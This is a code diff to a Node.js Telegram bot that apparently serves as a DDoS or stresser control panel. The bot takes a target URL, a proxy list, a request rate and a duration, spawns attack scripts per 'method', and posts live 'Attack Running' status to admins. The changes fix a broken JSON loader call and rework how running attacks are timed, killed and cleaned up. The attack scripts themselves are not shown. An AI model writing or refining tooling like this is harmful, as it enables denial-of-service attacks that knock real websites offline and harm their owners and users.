@@ -94,9 +94,7 @@ bot.onText(/\/methods/, async (msg) => {
 
 bot.onText(/\/bot\s+(on|off)/, async (msg, match) => {
   const chatId = msg.chat.id
-  const admins = await load—
-
-Json(ADMIN_LIST_PATH)
+  const admins = await loadJson(ADMIN_LIST_PATH)
   const isAdmin = Object.keys(admins).includes(String(msg.from.id))
 
   if (!isAdmin) {
@@ -134,7 +132,6 @@ bot.on('message', async (msg) => {
     const proxy = proxyFile || './prx.txt'
     const rate = parseInt(rateStr) || 20
 
-    // Chuẩn hóa URL
     if (!target) {
       bot.sendMessage(id, 'Target URL is required')
       return
@@ -217,13 +214,8 @@ bot.on('message', async (msg) => {
       }
       const elapsed = Math.floor((Date.now() - activeAttacks[attackId].startTime) / 1000)
       activeAttacks[attackId].remainingTime = Math.max(0, time - elapsed)
-      if (activeAttacks[attackId].remainingTime <= 0) {
-        activeAttacks[attackId].cmd.kill()
-        clearInterval(interval)
-        return
-      }
       const updatedResponse = {
-        status: 'Attack Running',
+        status: activeAttacks[attackId].remainingTime > 0 ? 'Attack Running' : 'Attack Finished',
         method,
         target,
         time: activeAttacks[attackId].remainingTime,
@@ -236,7 +228,7 @@ bot.on('message', async (msg) => {
       try {
         await bot.editMessageText('```json\n' + JSON.stringify(updatedResponse, null, 2) + '\n```', {
           chat_id: id,
-          message_id: sentMsg.message_id,
+          message_id: activeAttacks[attackId].messageId,
           parse_mode: 'Markdown',
           reply_markup: {
             inline_keyboard: [
@@ -249,10 +241,15 @@ bot.on('message', async (msg) => {
             ]
           }
         })
+        if (activeAttacks[attackId].remainingTime <= 0) {
+          activeAttacks[attackId].cmd.kill()
+          clearInterval(interval)
+          delete activeAttacks[attackId]
+        }
       } catch (err) {
         console.error(`Failed to edit message: ${err.message}`)
       }
-    }, 10000)
+    }, 5000)
 
     cmd.stderr.on('data', (data) => {
       console.error(`Script error: ${data}`)
@@ -275,6 +272,7 @@ bot.on('message', async (msg) => {
       if (activeAttacks[attackId]) {
         activeAttacks[attackId].cmd.kill()
         clearInterval(interval)
+        delete activeAttacks[attackId]
       }
     }, time * 1000)
   }
